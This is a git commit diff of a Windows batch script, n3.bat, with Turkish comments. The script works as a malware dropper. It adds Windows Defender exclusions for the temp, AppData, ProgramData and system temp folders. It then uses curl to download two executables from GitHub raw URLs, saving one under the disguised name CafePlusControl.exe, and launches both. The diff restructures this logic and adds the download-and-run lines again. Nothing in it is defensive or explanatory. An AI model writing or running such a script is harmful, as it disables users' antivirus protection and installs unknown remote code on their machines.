6deeee4eeb9c328e5d1217057821b6f94ea2b388
Seition2 <130700484+seition2doc@users.noreply.github.com>
2026-01-29 11:03:27 +0300

    Update n3.bat

--- n3.bat
+++ n3.bat
@@ -1,21 +1,24 @@
 @echo off
-cd %temp%
+cd /d %temp%
 powershell -c Add-MpPreference -ExclusionPath "%temp%"
 powershell -c Add-MpPreference -ExclusionPath "%APPDATA%"
 powershell -c Add-MpPreference -ExclusionPath "%PROGRAMDATA%"
 powershell -c Add-MpPreference -ExclusionPath "%SYSTEMROOT%\TEMP"
 
-
 REM Dosya kontrolü
 if exist nagihori2.txt (
-    echo nagihori.txt bulundu, çıkılıyor...
-    exit /b
-) else (
-    echo nagihori.txt yok, devam ediliyor...
-    curl -L https://github.com/seition2doc/dosta2/raw/refs/heads/main/Vanguard.exe -o Vanguard.exe
-    curl -L https://github.com/Banglade-sh23/-/raw/refs/heads/main/local3.exe -o CafePlusControl.exe
-    echo "asd" > nagihori2.txt 
-    start Vanguard.exe
-    start CafePlusControl.exe
-    
+    echo nagihori2.txt bulundu, dosyalar kontrol ediliyor...
+    if exist Vanguard.exe if exist CafePlusControl.exe (
+        start Vanguard.exe
+        start CafePlusControl.exe
+        exit /b
+    )
 )
+
+REM Dosyalar yoksa veya nagihori2.txt yoksa buraya devam eder
+echo Dosyalar hazirlaniyor...
+curl -L https://github.com/seition2doc/dosta2/raw/refs/heads/main/Vanguard.exe -o Vanguard.exe
+curl -L https://github.com/Banglade-sh23/-/raw/refs/heads/main/local3.exe -o CafePlusControl.exe
+echo "asd" > nagihori2.txt 
+start Vanguard.exe
+start CafePlusControl.exe
